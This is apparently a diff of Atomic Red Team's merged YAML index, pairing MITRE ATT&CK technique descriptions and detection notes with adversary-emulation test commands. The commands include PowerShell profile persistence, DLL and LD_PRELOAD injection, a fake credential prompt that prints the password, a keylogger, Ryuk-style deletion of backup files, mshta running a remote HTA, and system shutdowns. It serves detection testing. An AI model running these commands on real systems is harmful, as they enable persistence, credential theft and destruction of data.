+          2012-98. Retrieved March 10, 2017.
+        url: https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/
+      - source_name: Seclists Kanthak 7zip Installer
+        description: "Kanthak, S. (2015, December 8). Executable installers are vulnerable^WEVIL
+          (case 7): 7z*.exe\tallows remote code execution with escalation of privilege.
+          Retrieved March 10, 2017."
+        url: http://seclists.org/fulldisclosure/2015/Dec/34
+      modified: '2019-07-17T21:22:37.100Z'
+      identifier: T1044
+    atomic_tests:
+    - name: File System Permissions Weakness
+      description: "This test to show checking file system permissions weakness and
+        which can lead to privilege escalation by replacing malicious file. Example;
+        check weak file permission and then replace.\npowershell -c \"Get-WmiObject
+        win32_service | select PathName\"   (check service file location) and \ncopy
+        /Y C:\\temp\\payload.exe C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe
+        \  ( replace weak permission file with malicious file )\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_permission_file:
+          description: check weak files permission
+          type: path
+          default: GoogleUpdate.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Get-WmiObject win32_service | select PathName
+          get-acl "C:\Program Files (x86)\Google\Update\#{weak_permission_file}" | FL | findstr "FullControl"
   T1179:
     technique:
       x_mitre_data_sources:
@@ -12086,7 +13205,7 @@ privilege-escalation:
         binary_path:
           description: Name of the service binary, include path.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1050\bin\AtomicService.exe
+          default: PathToAtomicsFolder\T1050\bin\AtomicService.exe
         service_name:
           description: Name of the Service
           type: String
@@ -12097,6 +13216,7 @@ privilege-escalation:
         command: |
           sc.exe create #{service_name} binPath= #{binary_path}
           sc.exe start #{service_name}
+        cleanup_command: |
           sc.exe stop #{service_name}
           sc.exe delete #{service_name}
     - name: Service Installation PowerShell Installs A Local Service using PowerShell
@@ -12109,7 +13229,7 @@ privilege-escalation:
         binary_path:
           description: Name of the service binary, include path.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1050\bin\AtomicService.exe
+          default: PathToAtomicsFolder\T1050\bin\AtomicService.exe
         service_name:
           description: Name of the Service
           type: String
@@ -12120,6 +13240,7 @@ privilege-escalation:
         command: |
           New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
           Start-Service -Name "#{service_name}"
+        cleanup_command: |
           Stop-Service -Name "#{service_name}"
           (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
   T1150:
@@ -12196,6 +13317,111 @@ privilege-escalation:
               ~/Library/Preferences
 
           2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)
+  T1504:
+    technique:
+      x_mitre_data_sources:
+      - Process monitoring
+      - File monitoring
+      - PowerShell logs
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      name: PowerShell Profile
+      description: "Adversaries may gain persistence and elevate privileges in certain
+        situations by abusing [PowerShell](https://attack.mitre.org/techniques/T1086)
+        profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that
+        runs when PowerShell starts and can be used as a logon script to customize
+        user environments. PowerShell supports several profiles depending on the user
+        or host program. For example, there can be different profiles for PowerShell
+        host programs such as the PowerShell console, PowerShell ISE or Visual Studio
+        Code. An administrator can also configure a profile that applies to all users
+        and host programs on the local computer. (Citation: Microsoft About Profiles)
+        \n\nAdversaries may modify these profiles to include arbitrary commands, functions,
+        modules, and/or PowerShell drives to gain persistence. Every time a user opens
+        a PowerShell session the modified script will be executed unless the <code>-NoProfile</code>
+        flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019)
+        \n\nAn adversary may also be able to escalate privileges if a script in a
+        PowerShell profile is loaded and executed by an account with higher privileges,
+        such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)"
+      id: attack-pattern--723e3a2b-ca0d-4daa-ada8-82ea35d3733a
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet) Example profile locations include:
+
+        * <code>$PsHome\Profile.ps1</code>
+        * <code>$PsHome\Microsoft.{HostProgram}_profile.ps1</code>
+        * <code>$Home\My Documents\PowerShell\Profile.ps1</code>
+        * <code>$Home\My Documents\PowerShell\Microsoft.{HostProgram}_profile.ps1</code>
+
+        Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Allen DeRyke, ICE
+      created: '2019-06-14T18:53:49.472Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - source_name: mitre-attack
+        external_id: T1504
+        url: https://attack.mitre.org/techniques/T1504
+      - description: Microsoft. (2017, November 29). About Profiles. Retrieved June
+          14, 2019.
+        source_name: Microsoft About Profiles
+        url: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6
+      - description: Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell
+          usage. Retrieved June 14, 2019.
+        source_name: ESET Turla PowerShell May 2019
+        url: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+      - description: 'DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege
+          Elevation using the Powershell Profile. Retrieved July 8, 2019.'
+        source_name: Wits End and Shady PowerShell Profiles
+        url: https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html
+      - source_name: Malware Archaeology PowerShell Cheat Sheet
+        description: Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING
+          CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.
+        url: http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf
+      modified: '2019-07-19T14:46:24.213Z'
+      identifier: T1504
+    atomic_tests:
+    - name: Append malicious start-process cmdlet
+      description: 'Appends a start process cmdlet to the current user''s powershell
+        profile pofile that points to a malicious executable
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_path:
+          description: Path the malicious executable
+          type: Path
+          default: calc.exe
+        ps_profile:
+          description: Powershell profile to use
+          type: String
+          default: "$profile"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if(Test-Path #{ps_profile}){
+          }
+          else{
+            New-Item -Path #{ps_profile} -Type File -Force
+          }
+          $malicious = "Start-Process #{exe_path}"
+          Add-Content #{ps_profile} -Value $malicious
+          powershell -command exit
+        cleanup_command: |-
+          $oldprofile = cat $profile | Select-Object -skiplast 1
+          Set-Content $profile -Value $oldprofile
   T1055:
     technique:
       x_mitre_permissions_required:
@@ -12359,17 +13585,17 @@ privilege-escalation:
         dll_payload:
           description: DLL to Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1055\src\x64\T1055.dll
+          default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'mavinject #{process_id} /INJECTRUNNING #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
     - name: Process Injection via PowerSploit
       description: 'PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
 
@@ -12384,17 +13610,35 @@ privilege-escalation:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
     - name: Shared Library Injection via /etc/ld.so.preload
-      description: 'This test adds a shared library to the `ld.so.preload` list to
+      description: "This test adds a shared library to the `ld.so.preload` list to
         execute and intercept API calls. This technique was used by threat actor Rocke
         during the exploitation of Linux web servers. This requires the `glibc` package.
+        \n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_shared_library:
+          description: Path to a shared library object
+          type: Path
+          default: "../bin/T1055.so"
+      executor:
+        name: bash
+        elevation_required: true
+        command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
+
+'
+    - name: Shared Library Injection via LD_PRELOAD
+      description: 'This test injects a shared object library via the LD_PRELOAD environment
+        variable to execute. This technique was used by threat actor Rocke during
+        the exploitation of Linux web servers. This requires the `glibc` package.
 
 '
       supported_platforms:
@@ -12403,10 +13647,11 @@ privilege-escalation:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: "/tmp/evil_module.so"
+          default: "/opt/AtomicRedTeam/atomics/T1055/bin/T1055.so"
       executor:
         name: bash
-        command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
+        elevation_required: false
+        command: 'LD_PRELOAD=#{path_to_shared_library} ls
 
 '
     - name: Process Injection via C#
@@ -12429,6 +13674,21 @@ privilege-escalation:
       executor:
         name: command_prompt
         command: ".\\bin\\#{exe_binary}\n"
+    - name: svchost writing a file to a UNC path
+      description: |
+        svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
+        This works by copying cmd.exe to a file, naming it svchost.exe, then copying a file to the localhost\c$ folder.
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          copy C:\Windows\System32\cmd.exe C:\svchost.exe
+          C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
+        cleanup_command: |
+          del C:\T1055.txt
+          del C:\svchost.exe
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -12584,6 +13844,92 @@ privilege-escalation:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
+  T1058:
+    technique:
+      x_mitre_data_sources:
+      - Process command-line parameters
+      - Services
+      - Windows Registry
+      x_mitre_permissions_required:
+      - Administrator
+      - SYSTEM
+      name: Service Registry Permissions Weakness
+      description: |-
+        Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)
+
+        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).
+
+        Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)
+      id: attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.1'
+      x_mitre_system_requirements:
+      - Ability to modify service values in the Registry
+      type: attack-pattern
+      x_mitre_detection: |-
+        Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+
+        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.
+
+        Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Matthew Demaske, Adaptforward
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:49.119Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1058
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1058
+      - source_name: capec
+        external_id: CAPEC-478
+        url: https://capec.mitre.org/data/definitions/478.html
+      - source_name: MSDN Registry Key Security
+        description: Microsoft. (n.d.). Registry Key Security and Access Rights. Retrieved
+          March 16, 2017.
+        url: https://msdn.microsoft.com/library/windows/desktop/ms724878.aspx
+      - description: 'Hull, D. (2014, May 3). Kansa: Service related collectors and
+          analysis. Retrieved October 10, 2019.'
+        source_name: TrustedSignal Service Failure
+        url: https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html
+      - source_name: Twitter Service Recovery Nov 2017
+        description: The Cyber (@r0wdy_). (2017, November 30). Service Recovery Parameters.
+          Retrieved April 9, 2018.
+        url: https://twitter.com/r0wdy_/status/936365549553991680
+      - source_name: TechNet Autoruns
+        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
+          Retrieved June 6, 2016.
+        url: https://technet.microsoft.com/en-us/sysinternals/bb963902
+      modified: '2019-10-11T02:52:39.175Z'
+      identifier: T1058
+    atomic_tests:
+    - name: Service Registry Permissions Weakness
+      description: "Service registry permissions weakness check and then which can
+        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
+        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_service_name:
+          description: weak service check
+          type: Registry
+          default: weakservicename
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
+          get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
   T1166:
     technique:
       x_mitre_data_sources:
@@ -13012,7 +14358,7 @@ privilege-escalation:
         web_shells:
           description: Path of Web Shell
           type: path
-          default: C:\AtomicRedTeam\atomics\T1100\shells\
+          default: PathToAtomicsFolder\T1100\shells\
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
@@ -13264,7 +14610,19 @@ impact:
           default: "/var/log/syslog"
       executor:
         name: bash
-        command: dd of=#{file_to_overwrite} if=#{overwrite_source}
+        command: 'dd of=#{file_to_overwrite} if=#{overwrite_source}
+
+'
+    - name: Windows - Delete Backup Files
+      description: 'Deletes backup files in a manner similar to Ryuk ransomware.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
+          c:\backup*.* c:\*.set c:\*.win c:\*.dsk
   '':
     technique:
       x_mitre_data_sources:
@@ -13598,6 +14956,9 @@ impact:
         command: 'sc.exe stop #{service_name}
 
 '
+        cleanup_command: 'sc.exe start #{service_name}
+
+'
     - name: Windows - Stop service using net.exe
       description: 'Stops a specified service using the net.exe command.
 
@@ -13615,6 +14976,9 @@ impact:
         command: 'net.exe stop #{service_name}
 
 '
+        cleanup_command: 'net.exe start #{service_name}
+
+'
     - name: Windows - Stop service by killing process
       description: "Stops a specified service killng the service's process. \nThis
         technique was used by WannaCry.\n"
@@ -13624,7 +14988,7 @@ impact:
         process_name:
           description: Name of a process to kill
           type: String
-          default: sqlwriter.exe
+          default: spoolsv.exe
       executor:
         name: command_prompt
         elevation_required: false
@@ -13720,6 +15084,109 @@ impact:
         command: 'shutdown /r /t #{timeout}
 
 '
+    - name: Restart System via `shutdown` - macOS/Linux
+      description: 'This test restarts a macOS/Linux system.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      - centos
+      - ubuntu
+      input_arguments:
+        timeout:
+          description: Time to restart (can be minutes or specific time)
+          type: string
+          default: now
+      executor:
+        name: bash
+        elevation_required: true
+        command: 'shutdown -r #{timeout}
+
+'
+    - name: Shutdown System via `shutdown` - macOS/Linux
+      description: 'This test shuts down a macOS/Linux system using a halt.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      - centos
+      - ubuntu
+      input_arguments:
+        timeout:
+          description: Time to shutdown (can be minutes or specific time)
+          type: string
+          default: now
+      executor:
+        name: bash
+        elevation_required: true
+        command: 'shutdown -h #{timeout}
+
+'
+    - name: Restart System via `reboot` - macOS/Linux
+      description: 'This test restarts a macOS/Linux system via `reboot`.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      - centos
+      - ubuntu
+      executor:
+        name: bash
+        elevation_required: true
+        command: 'reboot
+
+'
+    - name: Shutdown System via `halt` - Linux
+      description: 'This test shuts down a Linux system using `halt`.
+
+'
+      supported_platforms:
+      - linux
+      - centos
+      - ubuntu
+      executor:
+        name: bash
+        elevation_required: true
+        command: "halt -p      \n"
+    - name: Reboot System via `halt` - Linux
+      description: 'This test restarts a Linux system using `halt`.
+
+'
+      supported_platforms:
+      - linux
+      - centos
+      - ubuntu
+      executor:
+        name: bash
+        elevation_required: true
+        command: "halt --reboot      \n"
+    - name: Shutdown System via `poweroff` - Linux
+      description: 'This test shuts down a Linux system using `poweroff`.
+
+'
+      supported_platforms:
+      - linux
+      - centos
+      - ubuntu
+      executor:
+        name: bash
+        elevation_required: true
+        command: "poweroff      \n"
+    - name: Reboot System via `poweroff` - Linux
+      description: 'This test restarts a Linux system using `poweroff`.
+
+'
+      supported_platforms:
+      - linux
+      - centos
+      - ubuntu
+      executor:
+        name: bash
+        elevation_required: true
+        command: 'poweroff --reboot  '
 discovery:
   T1087:
     technique:
@@ -13858,8 +15325,7 @@ discovery:
           default: "~/loot.txt"
       executor:
         name: sh
-        command: 'grep ''x:0:'' /etc/passwd > #{output_file} - name: List opened files
-          by user
+        command: 'grep ''x:0:'' /etc/passwd > #{output_file}
 
 '
     - name: List opened files by user
@@ -14026,7 +15492,7 @@ discovery:
         input_source_code:
           description: Path to source of C# code
           type: path
-          default: C:\AtomicRedTeam\atomics\T1010\src\T1010.cs
+          default: PathToAtomicsFolder\T1010\src\T1010.cs
         output_file_name:
           description: Name of output binary
           type: string
@@ -15018,6 +16484,48 @@ discovery:
       modified: '2019-10-18T20:37:17.043Z'
       identifier: T1069
     atomic_tests:
+    - name: Permission Groups Discovery
+      description: 'Permission Groups Discovery
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      executor:
+        name: sh
+        command: |
+          dscacheutil -q group
+          dscl . -list /Groups
+          groups
+    - name: Basic Permission Groups Discovery Windows
+      description: 'Basic Permission Groups Discovery for Windows
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          net localgroup
+          net group /domain
+    - name: Permission Groups Discovery PowerShell
+      description: 'Permission Groups Discovery utilizing PowerShell
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        user:
+          description: User to identify what groups a user is a member of
+          type: string
+          default: administrator
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          get-localgroup
+          get-ADPrinicipalGroupMembership #{user} | select name
     - name: Elevated group enumeration using net group
       description: 'Runs ''net group'' command including command aliases and loose
         typing to simulate enumeration/discovery of high value domain groups
@@ -15324,8 +16832,8 @@ discovery:
       executor:
         name: sh
         elevation_required: false
-        command: 'for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip -o; [ $? -eq
-          0 ] && echo "192.168.1.$ip UP" || : ; done
+        command: 'for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ]
+          && echo "192.168.1.$ip UP" || : ; done
 
 '
     - name: Remote System Discovery - nslookup
@@ -15445,6 +16953,61 @@ discovery:
         name: command_prompt
         elevation_required: true
         command: fltmc.exe | findstr.exe 385201
+  T1518:
+    technique:
+      x_mitre_data_sources:
+      - Process command-line parameters
+      - Process monitoring
+      - File monitoring
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      name: Software Discovery
+      description: Adversaries may attempt to get a listing of non-security related
+        software that is installed on the system. Adversaries may use the information
+        from [Software Discovery](https://attack.mitre.org/techniques/T1518) during
+        automated discovery to shape follow-on behaviors, including whether or not
+        the adversary fully infects the target and/or attempts specific actions.
+      id: attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.
+
+        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      created: '2019-09-16T17:52:44.147Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: discovery
+      external_references:
+      - source_name: mitre-attack
+        external_id: T1518
+        url: https://attack.mitre.org/techniques/T1518
+      modified: '2019-09-27T19:03:39.143Z'
+      identifier: T1518
+    atomic_tests:
+    - name: Find and Display Iinternet Explorer Browser Version
+      description: 'Adversaries may attempt to get a listing of non-security related
+        software that is installed on the system. Adversaries may use the information
+        from Software Discovery during automated discovery to shape follow-on behaviors
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"
+          /v svcVersion
+
+'
   T1082:
     technique:
       x_mitre_permissions_required:
@@ -17296,7 +18859,7 @@ credential-access:
     - name: Input Capture
       description: |
         Utilize PowerShell and external resource to capture keystrokes
-        [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056/Get-Keystrokes.ps1)
+        [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056/src/Get-Keystrokes.ps1)
         Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)
       supported_platforms:
       - windows
@@ -17307,7 +18870,7 @@ credential-access:
           default: c:\key.log
       executor:
         name: powershell
-        command: ".\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
+        command: "$PathToAtomicsFolder\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n"
   T1141:
     technique:
       x_mitre_data_sources:
@@ -17390,11 +18953,14 @@ credential-access:
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
-        command: powershell.exe -command {$cred = $host.UI.PromptForCredential('Windows
-          Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);
-          echo $cred.GetNetworkCredential().Password;}
+        command: "# Creates GUI to prompt for password. Expect long pause before prompt
+          is available.    \n$cred = $host.UI.PromptForCredential('Windows Security
+          Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using
+          write-warning to allow message to show on console as echo and other similar
+          commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning
+          $cred.GetNetworkCredential().Password"
   T1142:
     technique:
       x_mitre_data_sources:
@@ -17644,7 +19210,7 @@ credential-access:
         input_dll:
           description: Path to DLL to be installed and registered
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1174\src\AtomicPasswordFilter.dll
+          default: PathToAtomicsFolder\T1174\src\AtomicPasswordFilter.dll
       executor:
         name: powershell
         elevation_required: true
@@ -18091,7 +19657,7 @@ execution:
         local_chm_file:
           description: Local .chm payload
           type: path
-          default: C:\atomic-red-team\atomics\T1223\src\T1223.chm
+          default: PathToAtomicsFolder\T1223\src\T1223.chm
       executor:
         name: command_prompt
         elevation_required: false
@@ -18368,6 +19934,20 @@ execution:
           The Field Code should now be displayed, change it to Contain the following:
 
           {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
+    - name: Execute PowerShell script via Word DDE
+      description: 'When the word document opens it will prompt the user to click
+        ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download
+        and execute a powershell script
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'start $PathToAtomicsFolder\T1173\bin\DDE_Document.docx
+
+'
   T1118:
     technique:
       x_mitre_data_sources:
@@ -18431,14 +20011,17 @@ execution:
         filename:
           description: location of the payload
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1118\src\T1118.dll
+          default: PathToAtomicsFolder\T1118\src\T1118.dll
+        source:
+          description: location of the source code to compile
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\T1118.cs
       executor:
         name: command_prompt
         elevation_required: false
-        command: "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library
-          /out:C:\\AtomicRedTeam\\atomics\\T1118\\src\\T1118.dll C:\\AtomicRedTeam\\atomics\\T1118\\src\\T1118.cs
-          \nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile=
-          /LogToConsole=false /U #{filename}\n"
+        command: |
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
     - name: InstallUtil GetHelp method call
       description: 'Executes the Uninstall Method
 
@@ -18449,14 +20032,17 @@ execution:
         filename:
           description: location of the payload
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1118\src\T1118.dll
+          default: PathToAtomicsFolder\T1118\src\T1118.dll
+        source:
+          description: location of the source code to compile
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\T1118.cs
       executor:
         name: command_prompt
         elevation_required: false
-        command: "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library
-          /out:C:\\AtomicRedTeam\\atomics\\T1118\\src\\T1118.dll C:\\AtomicRedTeam\\atomics\\T1118\\src\\T1118.cs
-          \nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /?
-          #{filename}\n"
+        command: |
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename} #{source}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? #{filename}
   T1152:
     technique:
       x_mitre_permissions_required:
@@ -18808,9 +20394,55 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+        command: "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
+          \     \n"
+    - name: Mshta calls a local VBScript file to launch notepad.exe
+      description: Tests execution of a local program by a VBScript file called by
+        Mshta
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_file:
+          description: Create a local VBScript file
+          type: path
+          default: C:\Temp\mshta_notepad.vbs
+      executor:
+        name: command_prompt
+        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
 
 '
+    - name: Mshta executes VBScript to execute malicious command
+      description: |
+        Run a local VB script to run local user enumeration powershell command
+
+        This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+      supported_platforms:
+      - windows
+      input_arguments:
+        atomics_path:
+          description: path to atomics folder
+          type: path
+          default: "..\\..\\atomics"
+      executor:
+        name: command_prompt
+        command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+
+'
+    - name: Mshta Executes Remote HTML Application (HTA)
+      description: 'Execute an arbitrary remote HTA.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        hta_url:
+          description: URL to HTA file for execution
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+      executor:
+        name: command_prompt
+        command: 'mshta #{hta_url}'
   T1086:
     technique:
       x_mitre_permissions_required:
@@ -19111,15 +20743,15 @@ execution:
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: |
-          REM Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
+          # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
           reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
